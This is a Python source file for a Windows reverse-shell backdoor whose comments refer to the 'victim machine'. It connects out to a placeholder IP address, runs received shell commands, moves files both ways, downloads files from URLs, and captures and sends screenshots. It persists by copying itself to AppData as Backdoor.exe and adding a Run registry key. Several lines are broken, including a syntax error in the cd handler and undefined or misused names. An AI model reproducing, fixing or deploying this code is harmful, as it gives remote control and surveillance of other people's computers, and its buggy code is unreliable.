#!/usr/bin/python
import socket
import json
import subprocess
import time
import sys
import os
import shutil
import base64
import requests
import ctypes
from mss import mss

#This fun. allows us to recieve large bytes of data
def relaible_recv():
	global json_data 
	json_data=""
	while True:
		try:
			json_data=json_data + str(sock.recv(1024))
			return json.loads(json_data)
		except ValueError:
			continue

#This fun. allows us to send large bytes of data      
def relaible_send(data):
	json.dumps(data)
	sock.send(json_data)

#This fun. allows us to download files from the internet to the target machine
def download(url):
	get_response=requests.get(url)
	file_name=getresponse.split('/')[-1]
	with open(file_name,'wb') as out_file:
		out_file.write(get_response.content)

#This fun. allows us to capture screenshots of the victim machine
def screenshot():
	with mss() as screenshot:
		screenshot.shot()

#This fun. allows us to recieve commands for execution 
def shell():
	while True:
		command=relaible_recv()
		if command=='q':
			break
			
		elif command[:2]=='cd' and len(command)>1:
			try:
				os.chdir([:3])
			except:
				continue

		elif command[:8]=='download':
			with file.open(command[9:],'rb') as file:
				try:
					relaible_send(base64.b64encode(file.read()))
				except:
					failed="File not found "
					relaible_send(base64.b64encode(failed))

		elif command[:6]=='upload':
			with open(command[7:],'wb') as file:
				result=relaible_recv()
				file.write(base64.b64decode(result))

		elif command[:3]=='get':
			try:
				download(command[4:])
				relaible_send("[+]File downloaded successfully")
			except:
				relaible_send("[-]Failed to download the file")

		elif command[:10]=="screenshot":
			screenshot()
			try:
				with open("monitor-1.png","rb") as ss:
					relaible_send(base64.b64encode(ss.read()))
				os.remove("monitor-1.png")
			except:
				relaible_send("[-]Failed to capture screenshot")

		else:
			try:
				proc=subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
				result=proc.stdout.read()+proc.stderr.read()
				relaible_send(result)

			except:
				relaible_send("[!!]Can't execute the command: "+command)


#This fun. allows us to connect to the server 
def connection():
	while True:
		time.sleep(30)
		try:
			sock.connect(("<ip addr>",54321)) #Specify the victim's ip address
			shell()
		except:
			connection()
	
#This is a persistence 	
location=os.environ["appdata"]+"\\Backdoor.exe"
if not os.path.exists(location):
	shutil.copyfile(sys.executable,location)
	subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v reverse_shell /t REG_SZ /d"'+location+'"', shell=True)

sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connection()
sock.close()
